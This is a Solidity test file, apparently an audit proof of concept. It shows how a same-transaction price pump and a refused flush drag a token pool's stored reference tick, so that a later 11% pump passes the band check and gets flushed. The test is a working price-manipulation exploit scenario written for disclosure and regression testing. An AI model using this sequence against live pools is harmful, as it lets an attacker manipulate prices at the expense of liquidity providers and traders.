// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {console2} from "forge-std/console2.sol";
import {IntegrationBase} from "../integration/IntegrationBase.sol";
import {Token} from "../../src/Token.sol";
import {BondingCurve} from "../../src/BondingCurve.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {StateLibrary} from "@uniswap/v4-core/src/libraries/StateLibrary.sol";
import {PoolIdLibrary} from "@uniswap/v4-core/src/types/PoolId.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";

/// Round 4 (dadf081). B-1: the flush reference tick can be dragged by a same-transaction pump.
/// _nearRef stores the moved reference even when the flush is refused, and spends the whole idle allowance
/// (up to REF_MAX_CATCHUP = 600 s = 1000 ticks) on whatever tick the pool shows at that moment.
contract AuditPoC4 is IntegrationBase {
    using StateLibrary for IPoolManager;
    using PoolIdLibrary for PoolKey;

    function _tick(Token tok) internal view returns (int24 t) {
        (, t,,) = manager.getSlot0(_poolKey(tok).toId());
    }

    function _gradWithBuckets() internal returns (Token tok) {
        BondingCurve c;
        (c, tok) = _launch(0, 0);
        quote.mint(sniper, 3_000 ether);
        _buy(c, sniper, 3_000 ether, 0); // 99% sniper tax -> quote bucket at graduation
        _graduate(c);
        _refReady(tok);
        vm.roll(vm.getBlockNumber() + 1);
        // a little honest flow so the token bucket is non-empty as well
        _swapExactInQuoteForToken(tok, trader1, 200 ether);
        // honest keeper flushes while the price rests: the reference catches up with the pool
        for (uint256 i; i < 3; ++i) {
            vm.warp(vm.getBlockTimestamp() + 600);
            vm.roll(vm.getBlockNumber() + 1);
            lockedLP.flush(address(tok));
        }
    }

    /// Pump in 25-quote steps until the tick is `want` ticks above `from` in the buy direction.
    function _pumpTo(Token tok, address who, int24 from, int256 want, int256 s) internal returns (uint256 spent) {
        while ((int256(_tick(tok)) - from) * s < want) {
            _swapExactInQuoteForToken(tok, who, 25 ether);
            spent += 25 ether;
        }
    }

    function _run(bool drag) internal returns (int24 refMove, uint128 added, int256 offFair) {
        Token tok = _gradWithBuckets();
        int256 s = uint160(address(tok)) < uint160(address(quote)) ? int256(1) : int256(-1); // buy direction
        int24 fair = _tick(tok);
        (int24 r0,) = lockedLP.flushRef(address(tok));
        // the reference has caught up and nobody flushed for 10 minutes (an ordinary quiet stretch)
        vm.warp(vm.getBlockTimestamp() + 600);
        vm.roll(vm.getBlockNumber() + 1);
        address att = makeAddr("att");
        if (drag) {
            // one transaction: pump far, flush (refused, but the reference moves 1000 ticks toward the pump), dump
            _swapExactInQuoteForToken(tok, att, 4_000 ether);
            assertEq(lockedLP.flush(address(tok)), 0, "refused: out of band");
            _swapExactInTokenForQuote(tok, att, tok.balanceOf(att));
        }
        (int24 r1,) = lockedLP.flushRef(address(tok));
        refMove = r1 - r0;
        vm.warp(vm.getBlockTimestamp() + 1);
        vm.roll(vm.getBlockNumber() + 1);
        // next block: a pump to 1,100 ticks past the old reference (~11.6% above it), then flush
        int256 base = (int256(r0) - fair) * s;
        console2.log("old reference vs fair (ticks, buy direction)");
        console2.logInt(base);
        _pumpTo(tok, att, fair, base + 1_100, s);
        offFair = (int256(_tick(tok)) - fair) * s;
        added = lockedLP.flush(address(tok));
    }

    function test_B1_flashDragsFlushReference() public {
        uint256 snap = vm.snapshotState();
        (int24 m0, uint128 a0, int256 o0) = _run(false);
        vm.revertToState(snap);
        (int24 m1, uint128 a1, int256 o1) = _run(true);
        console2.log("no drag: ref move / flush added / ticks above fair");
        console2.logInt(m0);
        console2.log(a0);
        console2.logInt(o0);
        console2.log("dragged: ref move / flush added / ticks above fair");
        console2.logInt(m1);
        console2.log(a1);
        console2.logInt(o1);
        assertEq(a0, 0, "without the drag the band refuses an 11% pump");
        assertGt(a1, 0, "after one flash drag the same pump is flushed");
        assertGe(m1 >= 0 ? int256(m1) : -int256(m1), 1000, "one call moved the reference 1000 ticks");
    }
}
